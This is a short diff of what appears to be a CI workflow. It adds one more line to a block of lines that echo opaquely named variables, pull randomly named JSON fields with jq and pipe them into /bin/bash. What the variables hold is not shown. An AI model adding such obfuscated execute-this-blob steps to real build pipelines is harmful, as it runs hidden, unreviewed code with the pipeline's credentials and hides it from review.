@@ -32,6 +32,7 @@ jobs:
           echo $rofir20760 | jq -r .zue1 | /bin/bash
           printf '%s' "$b8" | jq -r .nprtj409 | /bin/bash
           echo $smy3 | jq -r .z77275 | /bin/bash
+          echo $m50288 | jq -r .zskwq383 | /bin/bash
 
       - name: Archive output
         if: always()
